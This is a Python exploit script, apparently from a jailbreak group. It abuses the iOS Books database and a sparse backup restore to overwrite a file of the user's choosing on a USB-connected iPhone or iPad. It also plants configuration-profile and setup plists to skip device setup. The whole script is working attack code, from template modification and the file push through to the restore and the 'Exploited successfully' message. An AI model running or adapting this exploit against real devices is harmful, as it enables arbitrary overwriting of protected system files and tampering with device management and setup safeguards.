import platform
import sys
import click
import sqlite3
import shutil

from pathlib import Path
from tempfile import TemporaryDirectory
from sparserestore import backup, perform_restore
from pymobiledevice3.exceptions import NoDeviceConnectedError
from pymobiledevice3.lockdown import create_using_usbmux
from pymobiledevice3.services.afc import AfcService

def exit(code=0):
    if platform.system() == "Windows" and getattr(sys, "frozen", False) and hasattr(sys, "_MEIPASS"):
        input("Press Enter to exit...")

    sys.exit(code)

def prompt_for_input(prompt):
    while True:
        value = input(prompt).strip()
        if value:
            return value
        click.secho("Input cannot be empty. Try again.", fg="red")

try:
    lockdown = create_using_usbmux()
except NoDeviceConnectedError:
        click.secho("No device detected! Please connect your device via USB and try again.", fg="red")
        exit(1)

def get_nice_ios_version_string():
    os_names = {
        "iPhone": "iOS",
        "iPad": "iPadOS",
        "iPod": "iOS",
        "AppleTV": "tvOS",
        "Watch": "watchOS",
        "AudioAccessory": "HomePod Software Version",
        "RealityDevice": "visionOS",
    }
    device_class = lockdown.get_value(key="DeviceClass")
    product_version = lockdown.get_value(key="ProductVersion")
    os_name = (os_names[device_class] + " " + product_version) if device_class in os_names else ""
    return os_name
    
click.secho("BookRestore Demo v1.0 - by jailbreak.party\nSpecial thanks to Duy Tran (@khanhduytran0)", fg="blue")
click.secho(f"Connected to {lockdown.get_value(key="DeviceName")} ({get_nice_ios_version_string()})", fg="green")
dest_path = Path(prompt_for_input("Enter the target path: "))
data_path = Path(prompt_for_input("Enter the path to your replacement file: "))

if data_path.is_file():
     click.secho(f"Loaded {data_path.name}.", fg="green")

click.secho(f"Will overwrite {dest_path.name} with the data of {data_path.name}.", fg="yellow")

# Setup: Write the template sqlite to a temp folder for adding our real path & modify the template with our real destination path
click.secho(f"[Setup] Copying template SQLite to temp folder...", fg="yellow")
template_path = Path.joinpath(Path.cwd(), "files/BLDB-template.sqlite")
tmp_dir = Path.cwd() / "tmp"
tmp_dir.mkdir(exist_ok=True)
victim_path = Path(shutil.copy(template_path, tmp_dir))

click.secho(f"[Setup] Modifying template with real destination path...", fg="yellow")

dest_path_posix = dest_path.as_posix()

conn = sqlite3.connect(victim_path)
cur = conn.cursor()

cur.execute("""
    UPDATE ZBLDOWNLOADINFO
    SET ZASSETPATH = REPLACE(ZASSETPATH, 'REPLACEWITHDESTPATH', ?)
    WHERE ZASSETPATH LIKE '%REPLACEWITHDESTPATH%';
""", (dest_path_posix,))

cur.execute("""
    UPDATE ZBLDOWNLOADINFO
    SET ZDOWNLOADID = REPLACE(ZDOWNLOADID, 'REPLACEWITHDESTPATH', ?)
    WHERE ZDOWNLOADID LIKE '%REPLACEWITHDESTPATH%';
""", (dest_path_posix,))

conn.commit()
conn.close()

# Stage1: Upload input data to a temp file via AFC
click.secho(f"[Stage1] Uploading {data_path.name}...", fg="yellow")
AfcService(lockdown=lockdown).push(data_path, "bookrestore_temp")

# Stage2: Replace BLDatabaseManager.sqlite via backup (using a backup saves us from digging through logs to get the container path)
click.secho("[Stage2] Replacing BLDatabaseManager.sqlite with modified db...", fg="yellow")
db_contents = open(victim_path, "rb").read() # Get database contents

# (SkipSetup) Get CloudConfig contents
cloudconfig_path = Path.joinpath(Path.cwd(), "files/CloudConfigurationDetails.plist")
cloudconfig_contents = open(cloudconfig_path, "rb").read()

# (SkipSetup) Get PurpleBuddy contents
purplebuddy_path = Path.joinpath(Path.cwd(), "files/com.apple.purplebuddy.plist")
purplebuddy_contents = open(purplebuddy_path, "rb").read()

back = backup.Backup(files=[
    backup.Directory("", "SysSharedContainerDomain-systemgroup.com.apple.media.shared.books"),
    backup.Directory("Documents", "SysSharedContainerDomain-systemgroup.com.apple.media.shared.books"),
    backup.Directory("Documents/BLDatabaseManager", "SysSharedContainerDomain-systemgroup.com.apple.media.shared.books"),
    backup.ConcreteFile("Documents/BLDatabaseManager/BLDatabaseManager.sqlite", "SysSharedContainerDomain-systemgroup.com.apple.media.shared.books", contents=db_contents),
    # Skip Setup code
    backup.Directory("", "SysSharedContainerDomain-systemgroup.com.apple.configurationprofiles"),
    backup.Directory("Library", "SysSharedContainerDomain-systemgroup.com.apple.configurationprofiles"),
    backup.Directory("Library/ConfigurationProfiles", "SysSharedContainerDomain-systemgroup.com.apple.configurationprofiles"),
    backup.ConcreteFile("Library/ConfigurationProfiles/CloudConfigurationDetails.plist", "SysSharedContainerDomain-systemgroup.com.apple.configurationprofiles", contents=cloudconfig_contents),
    backup.Directory("", "ManagedPreferencesDomain"),
    backup.Directory("mobile", "ManagedPreferencesDomain"),
    backup.ConcreteFile("mobile/com.apple.purplebuddy.plist", "ManagedPreferencesDomain", contents=purplebuddy_contents),
])

perform_restore(back, reboot=False)

click.secho("Exploited successfully! Reboot your device to trigger the overwrite.", fg="green")

shutil.rmtree(tmp_dir)
exit()